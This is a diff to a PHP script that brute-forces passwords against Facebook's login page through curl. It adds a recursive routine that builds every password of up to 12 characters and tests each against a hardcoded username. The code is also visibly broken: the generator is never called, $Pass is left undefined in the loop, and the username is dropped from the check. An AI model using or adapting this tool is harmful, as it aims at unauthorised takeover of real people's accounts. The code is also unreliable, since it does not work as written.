@@ -5,10 +5,27 @@ global $startpagina;
 $time = microtime() * 100000;
 $username = "kenkensquidkuddlephish";
 echo "https://twitter.com/LizardL4nds";
-while(True) {
-        $Pass = md5(mt_rand());
+define('P_MAX_LEN', 12);
+$c_set = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ01234567890!@#$%&*';          /*character set which is used to brute force the password*/
+$c_len = strlen($c_set); 		/*strlen() function is used to find the length of the character set*/
+function repeat($width, $position, $character)
+{     
+	global $c_set, $c_len; 
+		
+	for ($i = 0; $i < $c_len; $i++) 
+	{        
+		if ($position  < $width - 1) 
+		{    
+			repeat($width, $position + 1, $character . $c_set[$i]); 
+		}
+		     
+		check_correct($character . $c_set[$i]);    
+	}
+} 
 
-        if(check_correct($username, $Pass)) {
+while(True) {
+
+        if(check_correct($Pass)) {
             die("<table cellpadding='0' cellspacing='0' boreder='1' align='center' class='raster_table' width='75%'>
     <tr>
         <td>
@@ -33,7 +50,7 @@ ce attack.</b></div>
 
 
 // Function for checking whether the username and password are correct
-function check_correct($username, $Pass)
+function check_correct($Pass)
 {
         $c = curl_init('https://www.facebook.com/login');
         curl_setopt($c, CURLOPT_HTTPAUTH, CURLAUTH_ANY); // use authentication
